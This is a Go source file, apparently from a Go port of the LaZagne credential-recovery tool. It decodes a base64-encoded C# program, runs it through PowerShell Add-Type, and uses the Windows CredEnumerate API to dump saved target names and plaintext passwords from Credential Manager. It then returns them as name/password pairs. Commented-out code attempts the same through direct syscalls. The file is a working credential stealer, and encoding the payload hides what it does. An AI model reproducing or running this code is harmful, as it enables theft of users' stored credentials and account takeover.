package windows

import (
	"log"
	"syscall"

	"encoding/base64"
	"os/exec"
	"io/ioutil"
	"os"
	"strings"
	"goLaZagne/common"
)

type lifetime struct {
	LowDateTime  uint32
	HighDateTime uint32
}

type CredAttr struct {
	Keyword   *[]byte
	Flags     uint32
	Valuesize uint32
	Value     *[]byte
}

type Creds struct {
	FLAG               uint32
	TYPE               uint32
	TargetName         *[]byte
	Comment            *[]byte
	LastWritten        lifetime
	CredentialBlobSize uint32
	CredentialBlob     *byte
	Persist            uint32
	AttrCount          uint32
	Attributes         CredAttr
	TargetAlias        *[]byte
	Username           *[]byte
}

var (
	modkernel32 = syscall.NewLazyDLL("kernel32.dll")

	procGetLastError = modkernel32.NewProc("GetLastError")
	dlladvapi32      = syscall.NewLazyDLL("Advapi32.dll")
	CredEnumerateA   = dlladvapi32.NewProc("CredEnumerateA")
)

const (
	csharpGetData = "dXNpbmcgU3lzdGVtO3VzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcztwdWJsaWMgY2xhc3MgZ2V0RGF0YQp7W1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwsQ2hhclNldD1DaGFyU2V0LlVuaWNvZGUpXQpwdWJsaWMgc3RydWN0IE5hdGl2ZUNyZWRlbnRpYWwKe3B1YmxpYyB1aW50IEZsYWdzO3B1YmxpYyBlbnVtIENyZWRUeXBlOnVpbnR7R2VuZXJpYz0xLERvbWFpblBhc3N3b3JkPTIsRG9tYWluQ2VydGlmaWNhdGU9MyxEb21haW5WaXNpYmxlUGFzc3dvcmQ9NCxHZW5lcmljQ2VydGlmaWNhdGU9NSxEb21haW5FeHRlbmRlZD02LE1heGltdW09NyxNYXhpbXVtRXg9KE1heGltdW0rMTAwMCksfQpwdWJsaWMgSW50UHRyIFRhcmdldE5hbWU7cHVibGljIEludFB0ciBDb21tZW50O3B1YmxpYyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuQ29tVHlwZXMuRklMRVRJTUUgTGFzdFdyaXR0ZW47cHVibGljIHVpbnQgQ3JlZGVudGlhbEJsb2JTaXplO3B1YmxpYyBJbnRQdHIgQ3JlZGVudGlhbEJsb2I7cHVibGljIHVpbnQgUGVyc2lzdDtwdWJsaWMgdWludCBBdHRyaWJ1dGVDb3VudDtwdWJsaWMgSW50UHRyIEF0dHJpYnV0ZXM7cHVibGljIEludFB0ciBUYXJnZXRBbGlhcztwdWJsaWMgSW50UHRyIFVzZXJOYW1lO30KW0RsbEltcG9ydCgiQWR2YXBpMzIuZGxsIixTZXRMYXN0RXJyb3I9dHJ1ZSxFbnRyeVBvaW50PSJDcmVkRW51bWVyYXRlQSIsQ2hhclNldD1DaGFyU2V0LlVuaWNvZGUpXQpwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIENyZWRFbnVtZXJhdGUoW0luXXN0cmluZyBmaWx0ZXIsW0luXWludCBmbGFncyxvdXQgaW50IGNvdW50LG91dCBJbnRQdHIgY3JlZGVudGlhbFB0cnMpO3B1YmxpYyBzdGF0aWMgdm9pZCBnZXQoKXtpbnQgY291bnQ7SW50UHRyIHBDcmVkZW50aWFscztib29sIHJlYWQ9Q3JlZEVudW1lcmF0ZShudWxsLDB4MCxvdXQgY291bnQsb3V0IHBDcmVkZW50aWFscyk7Zm9yKGludCBpbng9MDtpbng8Y291bnQ7aW54KyspCntJbnRQdHIgcENyZWQ9TWFyc2hhbC5SZWFkSW50UHRyKHBDcmVkZW50aWFscyxpbngqSW50UHRyLlNpemUpO05hdGl2ZUNyZWRlbnRpYWwgbmF0aXZlQ3JlZGVudGlhbD0oTmF0aXZlQ3JlZGVudGlhbClNYXJzaGFsLlB0clRvU3RydWN0dXJlKHBDcmVkLHR5cGVvZihOYXRpdmVDcmVkZW50aWFsKSk7c3RyaW5nIHVzZXJuYW1lPU1hcnNoYWwuUHRyVG9TdHJpbmdVbmkobmF0aXZlQ3JlZGVudGlhbC5UYXJnZXROYW1lKTtpZigwPG5hdGl2ZUNyZWRlbnRpYWwuQ3JlZGVudGlhbEJsb2JTaXplKXtzdHJpbmcgdGFyZ2V0bmFtZT1NYXJzaGFsLlB0clRvU3RyaW5nQW5zaShuYXRpdmVDcmVkZW50aWFsLlRhcmdldE5hbWUpO3N0cmluZyBwYXNzd29yZD1NYXJzaGFsLlB0clRvU3RyaW5nVW5pKG5hdGl2ZUNyZWRlbnRpYWwuQ3JlZGVudGlhbEJsb2IsKGludCluYXRpdmVDcmVkZW50aWFsLkNyZWRlbnRpYWxCbG9iU2l6ZS8yKTtpZihwYXNzd29yZC5MZW5ndGg+NjQpe2NvbnRpbnVlO30KQ29uc29sZS5Xcml0ZUxpbmUodGFyZ2V0bmFtZSsiICIrcGFzc3dvcmQpO319fX0="
)

func CredManModuleStart() common.ExtractWifiData{
	var csDecoded, err = base64.StdEncoding.DecodeString(csharpGetData)
	if err != nil{
		log.Panic(err.Error())
	}
	tmpfile, err := ioutil.TempFile("", "tempfile")
	if err != nil {
		log.Fatal(err)
	}
	defer os.Remove(tmpfile.Name()) // clean up
	if _, err := tmpfile.Write(csDecoded); err != nil {
		log.Println(err) //Оставлю тут на будущее
	}
	var csToExec = "$source = Get-Content -Path \"" + tmpfile.Name() +"\";"
	//log.Println(csToExec)
	cmd := exec.Command("powershell", csToExec, "Add-Type", "-TypeDefinition", "\"$source\";", "[getdata]::get()")
	var(
		output, _ = cmd.Output()
		credentialData = strings.Split(string(output), "\n")
		Result common.ExtractWifiData
		data []common.NamePass
	)

	for i:=range credentialData{
		var tmpElems = strings.Split(credentialData[i], " ")
		//log.Println(tmpElems[0], strings.Join(tmpElems[1:], ""))

		if len(tmpElems[0]) == 0{
			continue
		}

		var dataAdd = common.NamePass{
			tmpElems[0],
			strings.Join(tmpElems[1:], ""),
			//"success",
		}
		data = append(data, dataAdd)
	}

	if len(data) == 0 {
		Result.Success = false
		return Result
	}

	Result.Data = data
	Result.Success = true
	return Result

	//fmt.Println("Result: " + string(charmap.CP866_to_UTF8([]byte(out.String()))))
	/*
	var count uint64
	var creds **Creds
	var targetName = "https://github.com"
	CredEnumerateA.Call(uintptr(unsafe.Pointer(&targetName)), 0, uintptr(unsafe.Pointer(&count)), uintptr(unsafe.Pointer(&creds)))


	test := (*[512]Creds)(unsafe.Pointer(*creds))

	//log.Println(*creds)
	fmt.Println(count)
	ar test []Creds
	test = *creds

//	log.Println((*creds)[0])


	var time = (uint64(test[0].LastWritten.HighDateTime)<<32 )+uint64(test[0].LastWritten.LowDateTime) // Что это за колдунство?

	//log.Printf("time : %d",time)
	//log.Println(test)


	for i := 0; i < int(count); i++ {
		if test[i].TYPE>10 || test[i].TYPE<1 {continue}
		log.Println(test[i])

		//log.Println(&(test[i].CredentialBlob)[0])

		p := (*[512]byte)(unsafe.Pointer(test[i].CredentialBlob))
		log.Printf("size %d",test[i].CredentialBlobSize)
		//log.Printf("%+#v, length of slice %d capacity %d ", test[i].CredentialBlob, len(*test[i].CredentialBlob), cap(*test[i].CredentialBlob))

		//log.Println((*test[i].CredentialBlob)[0])

//		log.Println(p)

		for j := 0; j < int(test[i].CredentialBlobSize); j++ {
			//fmt.Print(string([]byte{p[j]}))
		}
		//fmt.Println()
	}
	//log.Println(test[0])

	//log.Println(test[1])
	//fmt.Println(test[0])
	//fmt.Println(test[1])
	//log.Println(GetLastError())
	*/


}
